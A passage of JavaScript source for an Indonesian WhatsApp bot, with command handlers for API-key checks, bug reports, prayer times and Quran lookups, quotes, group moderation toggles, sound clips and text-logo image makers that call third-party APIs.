             if (batas > 30) return freply('Maks 30!')
             freply(mess.wait)
             cok = await Ramdani.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return freply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) freply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             Ramdani.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
}
             } catch (e) {
             return freply(String(e))
}
             } else {
             freply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)
}
             break
       case 'lolkey':
       case 'cekapikey':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              if (args.length < 1) return freply(`Ketik ${prefix}lolkey [Apikeynya]`) 
              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
              teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
              Ramdani.sendMessage(from, teks, text, {quoted: troli})
              break
       case 'bugreport':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length < 1) return freply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              freply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              Ramdani.sendMessage('6289512545999@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              break
       case 'readall':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              totalchat.map( async ({ jid }) => {
              await Ramdani.chatRead(jid)
})
              freply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
              console.log(totalchat.length)
              break	
              
//-------------------< islam menu >--------------------

case 'kisahnabi':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
                    if (args.length == 0) return freply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolhumanapi}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    freply(ini_txt)
                    break
case 'jadwalsholat':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
                    if (args.length == 0) return freply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolhumanapi}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    freply(ini_txt)
                    break  
             case 'listsurah':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${lolhumanapi}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    freply(ini_txt)
                    break                                              
case 'alquran':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    if (args.length < 1) return freply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${lolhumanapi}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    freply(ini_txt)
                    break
case 'asmaulhusna':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolhumanapi}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    freply(ini_txt)
                    break
 case 'alquranaudio':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    if (args.length == 0) return freply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolhumanapi}`)
                    Ramdani.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })      
                    break                                         
//------------------< serti menu >-------------------   
case 'sertitolol': 				
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
				if (args.length < 1) return freply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti KURR GAMTENG`)
				ct = body.slice(12)
				zhain = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${lolhumanapi}&name=${ct}`)
				Ramdani.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
				break
//------------------< cerita menu >-------------------
case 'cerpen':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${lolhumanapi}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    freply(ini_txt)
                    break
case 'ceritahoror':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${lolhumanapi}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                     break 
//------------------(KATA KATA MENU)---------+--------
     case 'quotes':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolhumanapi}`)
                    quotes = quotes.result
                    author = quotes.by
                    quotes = quotes.quote
                    freply(`_${quotes}_\n\n*― ${author}*`)
                    break
                case 'quotesanime':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolhumanapi}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    freply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                    break
case 'quotesdilan':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolhumanapi}`)
                    freply(quotedilan.result)
                    break   
               case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumanapi}`)
                    freply(get_result.result)
                    break                                         
//------------------< enable/disable>-------------------
              case 'leveling':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroup) return freply(mess.only.group)
              if (ar[0] === 'enable') {
              if (isLevelingOn) return freply('Fitur leveling telah diaktifkan sebelumnya.')
            _leveling.push(from)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              freply('Fitur leveling berhasil diaktifkan.')
              } else if (ar[0] === 'disable') {
              var anup = _leveling.indexOf(from)
            _leveling.splice(anup, 1)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              freply('Fitur leveling berhasil dimatikan.')
              } else {
              freply('Pilih enable atau disable!')
}
              break
       case 'antilink':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (!isGroup) return freply(mess.only.group)
              if (!isBotGroupAdmins) return freply(`Bot Harus jadi Admin`)
              if (!q) return freply(`Pilih enable atau disable`)
              if (args[0].toLowerCase() === 'enable'){
              if (isAntiLink) return freply(`Udah aktif`)
              antilink.push(from)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              freply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
              } else if (args[0].toLowerCase() === 'disable'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              freply('*「 ANTILINK DI NONAKTIFKAN 」*')
              } else {
              freply(`Pilih enable atau disable`)
}
              break
       case 'welcome':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               if (!isGroupAdmins) return freply(mess.only.admin)
               if (!isGroup) return freply(mess.only.group)
               if (args.length < 1) return freply('!welcome enable/disable')
               if ((args[0]) === 'enable') {
               if (isWelkom) return freply('Udah aktif')
               welkom.push(from)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               freply('Sukses mengaktifkan fitur welcome di group ini ✔️')
               } else if ((args[0]) === 'disable') {
               welkom.splice(from, 1)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               freply('Sukses menonaktifkan fitur welcome di group ini ✔️')
               } else {
               freply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               break
        case 'mute':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               if (!isGroup) return freply(mess.only.group)
               if (!isGroupAdmins) return freply(mess.only.admin)
               if (args.length < 1) return freply('!mute enable/disable')
               if (args[0].toLowerCase() === 'enable'){
               if (isMuted) return freply(`udah di mute`)
               mute.push(from)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               freply(`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${namabot}*_`)
               } else if (args[0].toLowerCase() === 'disable'){
               anu = mute.indexOf(from)
               mute.splice(anu, 1)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               freply(`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${namabot}*_`)
               } else {
               freply(`Pilih enable atau disable`)
}
               break
        case 'grupsetting':
        case 'groupsetting':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               if (!isGroup) return freply(mess.only.group)
               if (!isGroupAdmins) return freply(mess.only.admin)
               list = []
               com = [`group buka`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]
               comm = [`group tutup`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]
               listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]
               suruh = [`Enable`, `Disable`]
               fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]
               startnum = 0; let startnu = 0; let startn = 0;let start = 0
               startnumm = 1
               for (let x of com) {
               var yy = {title: `${listnya[startnum++]}`,
                    rows: [
                       {
                        title: `${suruh[0]}`,
                        description: `\nMengaktifkan ${fiturname[startnu++]}`,
                        rowId: `${prefix}${x}`
                      },{
                        title: `${suruh[1]}`,
                        description: `\nMenonaktifkan ${fiturname[startn++]}`,
                        rowId: `${prefix}${comm[start++]}`
                      }
                    ]
                   }
                        list.push(yy)
           }
             listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)
        
             break
 		case 'group':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
					if (!isGroup) return freply(ind.groupo())
					if (!isGroupAdmins) return freply(ind.admin())
					if (!isBotGroupAdmins) return freply(ind.badmin())
					if (args[0] === 'buka') {
					    freply(`*BERHASIL MEMBUKA GROUP*`)
						Ramdani.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						freply(`*BERHASIL MENUTUP GROUP*`)
						Ramdani.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break   
//--------------<soundnya vang:v>-----------------
      case 'Assalamualaikum':
      case 'assalamualaikum':
             assalamualaikum = fs.readFileSync('./media/salam.mp3');
             Ramdani.sendMessage(from, assalamualaikum, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
             break
             case 'sound1':
satu = fs.readFileSync('./media/audio/sound1.mp3');
Ramdani.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./media/audio/sound2.mp3');
Ramdani.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./media/audio/sound3.mp3');
Ramdani.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./media/audio/sound4.mp3');
Ramdani.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./media/audio/sound5.mp3');
Ramdani.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./media/audio/sound6.mp3');
Ramdani.sendMessage(from, enam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./media/audio/sound7.mp3');
Ramdani.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break									
case 'sound8':
delapan = fs.readFileSync('./media/audio/sound8.mp3');
Ramdani.sendMessage(from, delapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound9':
sembilan = fs.readFileSync('./media/audio/sound9.mp3');
Ramdani.sendMessage(from, sembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound10':
sepuluh = fs.readFileSync('./media/audio/sound10.mp3');
Ramdani.sendMessage(from, sepuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound11':
sebelas = fs.readFileSync('./media/audio/sound11.mp3');
Ramdani.sendMessage(from, sebelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound12':
duabelas = fs.readFileSync('./media/audio/sound12.mp3');
Ramdani.sendMessage(from, duabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound13':
tigabelas = fs.readFileSync('./media/audio/sound13.mp3');
Ramdani.sendMessage(from, tigabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound14':
empatbelas = fs.readFileSync('./media/audio/sound14.mp3');
Ramdani.sendMessage(from, empatbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound15':
limabelas = fs.readFileSync('./media/audio/sound15.mp3');
Ramdani.sendMessage(from, limabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

//---------------<hewan menu 🗿>---------------
case 'kambing':
case 'kuda':
case 'ular':  
case 'anjing':
case 'kucing':
case 'kelinci':
case 'buaya':
case 'elang':
case 'ayam':
case 'babi':
case 'ulat':
case 'burung':
case 'bebek':
case 'angsa':
case 'sapi': 
case 'badak':
case 'unta':
case 'harimau':
case 'singa':
case 'monyet':
case 'ikan':
case 'ikan hiu':
case 'tikus':
case 'kelinci':
case 'siput':
case 'domba':
case 'katak':
case 'naga':
case 'laba-laba':
case 'kupu-kupu':
case 'kalajengkin': 
case 'kingkong':
case 'jerapa':
case 'gajah':
case 'serigala':
case 'cikcak':
case 'pinguin':
case 'burung hantu':
case 'burung gagak':
case 'burung puyuh':
case 'ikan laga':
case 'ikan kembung':
case 'kepiting':
case 'ubur-ubur':
case 'lebah':
case 'kura-kura':
case 'banteng':
case 'kelalawar':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`*MOHON MAAF FITUR INI SEDANG MAINTENANCE/DI PERBARUI!!!*`)
reply = fs.readFileSync('./media/ara2.mp3');
             Ramdani.sendMessage(from, reply, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
             break
   
//══════════[ FITUR MAKER ]══════════//
case 'blackpink':
case 'halloween':
case '3dgradient':
case 'naturalleaves':
case 'dropwater':
case 'blood':
case 'blood2':
case 'neondevil':
case 'neon':
case 'neonlight':
case 'neonlight2':
case 'neonlight3':
case 'greenneon':
case 'toxic':
case 'matrix':
case 'thunder':
case 'thunder2':
case 'bokeh':
case 'carbontext':
case 'christmas':
case 'breakwall':
case 'roadwarning':
case 'engraved3d':
case 'embossed':
case 'writefoggy':
case '3dstone':
case 'futuristic':
case 'asketch':
case 'bluecircuit':
case 'space':
case 'amagmahot':
case 'artpapercut':
case '3dluxurygold':
case 'robotr2d2':
case 'harrypotter':
case 'glitch3':
case 'greenhorrorstyle':
case '3ddeepseametal':
case 'leddisplayscreen':
case 'wonderfulgraffitiart':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/${command}?apikey=${ramdaniapi}&text=${teks}`)
oke = await getBuffer(anu.result)
Ramdani.sendMessage(from, oke, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
break
case 'hartatahta': 
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
freply(mess.wait)
harta = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/harta-tahta?apikey=${ramdaniapi}&text=${teks}`)
Ramdani.sendMessage(from, harta, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
break

//----> 2 TEXT <----//

case '8bit':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/8bit?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'pornhub':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/pornhub?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'glitch':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/glitch?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'glitch2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/glitch2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'layered':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/layered?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case '3dsteel':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/3dsteel?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'realistic':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/realistic?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'lionlogo':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/lionlogo?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'ninjalogo':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/ninjalogo?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'wolf':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/logowolf?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'wolf2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(6)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/logowolf2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'halloween2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(11)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/halloween2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'marvel':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/marvelstudio?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'marvel2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/marvelstudio2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'cinematichorror':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(16)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/cinematichorror?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'avengers':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/avengerslogo?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'graffiti3':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/coolwallgraffiti?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'captainamerica':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(15)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
